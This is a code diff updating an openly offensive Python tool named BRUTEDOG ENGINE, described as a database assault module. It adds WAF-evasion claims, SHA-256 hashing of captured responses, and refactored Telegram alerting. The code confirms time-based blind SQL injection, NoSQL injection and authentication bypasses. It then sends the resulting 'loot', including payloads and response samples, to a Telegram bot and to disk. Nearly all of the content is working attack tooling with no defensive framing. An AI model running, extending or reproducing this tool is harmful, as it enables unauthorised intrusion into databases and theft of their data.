@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v8.0 — Polymorphic Adaptive Database Assault Module (Hardened & WAF-Bypassing Edition)
+BRUTEDOG ENGINE v8.6 — Polymorphic Adaptive Database Assault Module (Elite Red Team Adversarial Edition)
 Features:
 - Advanced WAF evasion via randomized browser headers, client hints, and Poisson timing jitter
 - Expanded NoSQL Prototype Pollution & Deep Operator Vectors (`$in`, `$exists`, `__proto__`, `constructor`)
-- Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi
-- Real-time error-pattern fingerprinting & adaptive payload mutation
-- Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates
-- Automated immutable disk persistence (loot_output/) via centralized framework logger
-- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
+- Dual-probe confirmed baseline latency calibration for verified time-based blind SQLi with SHA-256 integrity hashing
+- Real-time error-pattern fingerprinting & adaptive payload mutation with SHA-256 tamper-evident immutable disk logging
+- Polymorphic type-variant fuzzing with strict anti-HTML / anti-SPA verification gates and real-time Telegram telemetry
 """
 import asyncio
 import http.client
@@ -18,6 +16,7 @@ import time
 import sys
 import re
 import random
+import hashlib
 from urllib.parse import urlsplit
 
 # Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
@@ -45,14 +44,23 @@ def log(msg, color="GREEN"):
     sys.stdout.write(f"{ansi_color}{msg}{COLORS['RESET']}\n")
     sys.stdout.flush()
 
+async def dispatch_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def dispatch_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(dispatch_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(dispatch_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(dispatch_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -159,7 +167,7 @@ async def calibrate_baseline(host, port, endpoint, secure):
     return 4.5
 
 async def run_nosql_assault(target_host, port=None, use_ssl=None):
-    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8 HARDENED & WAF BYPASS) [***]", "PURPLE")
+    log("\n[***] INITIALIZING POLYMORPHIC ADAPTIVE DATABASE ASSAULT (V8.6 HARDENED & WAF BYPASS) [***]", "PURPLE")
     parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
     host = parsed.hostname
     secure = parsed.scheme == "https"
@@ -197,10 +205,18 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 
                 if res2["elapsed"] >= time_threshold:
                     log(f"[!] CONFIRMED ADAPTIVE TIME-BASED BLIND SQLi [{endpoint}] (Delays: {res1['elapsed']}s, {res2['elapsed']}s)", "RED")
-                    finding = {"vector": "Time-Based Blind SQLi", "endpoint": endpoint, "payload": payload, "delays": [res1["elapsed"], res2["elapsed"]]}
+                    
+                    loot_hash = hashlib.sha256(res2["body"].encode("utf-8", errors="ignore")).hexdigest()
+                    finding = {
+                        "vector": "Time-Based Blind SQLi",
+                        "endpoint": endpoint,
+                        "payload": payload,
+                        "integrity_hash": loot_hash,
+                        "delays": [res1["elapsed"], res2["elapsed"]]
+                    }
                     findings.append(finding)
                     
-                    # Dispatch to Telegram and Disk
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     dispatch_tg_alert_sync("Time-Based Blind SQLi Confirmed", finding)
                     stream_proof("DB_TIME_BASED_SQLI_CONFIRMED", endpoint, {"payload": payload}, f"Verified Delays: {res1['elapsed']}s, {res2['elapsed']}s", finding)
                     save_session_loot(
@@ -226,10 +242,17 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 error_match = DB_ERROR_PATTERNS.search(res["body"])
                 if error_match and "must be a string" not in error_match.group(0):
                     log(f"[!] Database Error Leaked [{endpoint}] ({vector['name']} - {variant_type}): {error_match.group(0)}", "YELLOW")
-                    finding = {"vector": f"Error-Based Inference [{variant_type}]", "endpoint": endpoint, "error": error_match.group(0)}
+                    
+                    loot_hash = hashlib.sha256(res["body"].encode("utf-8", errors="ignore")).hexdigest()
+                    finding = {
+                        "vector": f"Error-Based Inference [{variant_type}]",
+                        "endpoint": endpoint,
+                        "error": error_match.group(0),
+                        "integrity_hash": loot_hash
+                    }
                     findings.append(finding)
                     
-                    # Dispatch to Telegram and Disk
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     dispatch_tg_alert_sync(f"Database Error Leak ({vector['name']})", finding)
                     stream_proof("DB_ERROR_LEAK", endpoint, {"vector": vector["name"]}, error_match.group(0), finding)
                     save_session_loot(
@@ -260,15 +283,18 @@ async def run_nosql_assault(target_host, port=None, use_ssl=None):
                 if res["status"] in (200, 201, 302) and not is_spa_or_html and has_auth_indicators:
                     log(f"[+] VERIFIED DATABASE BYPASS / EXFILTRATION [{endpoint}] ({vector['name']} - {variant_type})", "GREEN")
                     log(f"  └── Response Excerpt: {res['body'][:150]}", "CYAN")
+                    
+                    loot_hash = hashlib.sha256(res["body"].encode("utf-8", errors="ignore")).hexdigest()
                     finding = {
                         "vector": f"Polymorphic Injection [{variant_type}]", 
                         "endpoint": endpoint, 
                         "payload": str(payload), 
+                        "integrity_hash": loot_hash,
                         "response_sample": res["body"][:300]
                     }
                     findings.append(finding)
                     
-                    # Dispatch verified bypass loot straight to Telegram and Disk
+                    # BROADCAST, STREAM PROOF & PERSIST TO IMMUTABLE DISK
                     dispatch_tg_alert_sync(f"Database Polymorphic Bypass Verified ({vector['name']})", finding)
                     stream_proof("DB_BYPASS_VERIFIED", endpoint, {"vector": vector["name"]}, res["body"][:300], finding)
                     save_session_loot(
